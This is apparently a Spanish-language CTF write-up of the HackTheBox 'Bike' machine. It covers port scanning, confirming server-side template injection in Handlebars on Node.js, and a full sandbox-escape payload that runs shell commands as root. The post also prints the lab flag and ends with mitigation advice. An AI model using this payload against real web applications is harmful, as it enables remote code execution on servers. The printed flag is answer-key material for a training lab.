---
layout: post
title: HTB — Bike
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: SSTI (Server Side Template Injection) en Handlebars/Node.js
tags:
  - STTI
  - Windows
---

## Introducción

Bike introduce **SSTI (Server Side Template Injection)** — una vulnerabilidad donde el input del usuario es procesado directamente por el motor de plantillas del servidor en lugar de tratarse como texto. En este caso el motor es **Handlebars** corriendo sobre **Node.js/Express**, y la explotación requiere escapar el sandbox del motor para lograr ejecución de código remoto.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p22,80 10.129.x.x -oN target
# -sC       Ejecuta scripts de detección por defecto (NSE)
# -sV       Detecta versión del servicio
# -p22,80   Escanea solo los puertos especificados
# -oN       Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Node.js
|_http-title: Bike
```

---

## Enumeración web

Visito `http://10.129.x.x` — sitio con un campo de email y botón Submit. Al enviar un email, el sitio refleja el input:

```
We will contact you at: test@test.com
```

Cualquier campo que refleje input del usuario es candidato a SSTI.

---

## Explotación — Fase 1: confirmar SSTI

Ingreso el payload de detección:

```
{{7*7}}
```

El servidor devuelve un error de parse de Handlebars — confirma que el input llega directamente al motor de plantillas. El stack trace revela:

```
handlebars/dist/cjs/handlebars/compiler
node_modules/express
/root/Backend/
```

Motor: **Handlebars**. Runtime: **Node.js/Express**.

---

## Explotación — Fase 2: bypass de sandbox y RCE

Handlebars corre en sandbox y bloquea `require` directamente. El bypass usa `process.mainModule.require` para acceder al módulo principal de Node.js:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

El sitio devuelve:

```
uid=0(root) gid=0(root) groups=0(root)
```

RCE confirmado como root.

---

## Flag

Cambio `id` por `cat /root/flag.txt` en el payload:

```
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt').toString();"}}
```

```
6b258d726d287462d60c103d0142a81c
```

---

## ¿Qué aprendemos de esto?

**SSTI es una de las vulnerabilidades más críticas en aplicaciones web modernas.** A diferencia de XSS que afecta al cliente, SSTI ejecuta código en el servidor — con frecuencia con los mismos privilegios que la aplicación, que en este caso era root.

**Identificar el motor de plantillas es el paso más importante.** Cada motor tiene su sintaxis y sus vectores de explotación. `{{7*7}}` funciona en Jinja2/Twig, `${7*7}` en FreeMarker, `{{7*7}}` en Handlebars genera error — el error mismo revela el motor.

**Los sandboxes no son seguros por defecto.** Handlebars implementa un sandbox para prevenir acceso a objetos peligrosos, pero `process.mainModule` permite escaparlo accediendo al módulo principal de Node.js. Un sandbox mal implementado da falsa sensación de seguridad.

**Nunca pasar input del usuario directamente a un motor de plantillas.** La solución es tratar el input siempre como datos, nunca como plantilla.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 80/tcp (Node.js/Express) |
| Motor de plantillas | Handlebars |
| Vulnerabilidad | SSTI — input del usuario procesado como plantilla |
| Acceso obtenido | RCE como root |
| Herramientas | `nmap`, navegador |
| Mitigación | Nunca renderizar input del usuario como plantilla, actualizar Handlebars, no correr aplicaciones web como root |
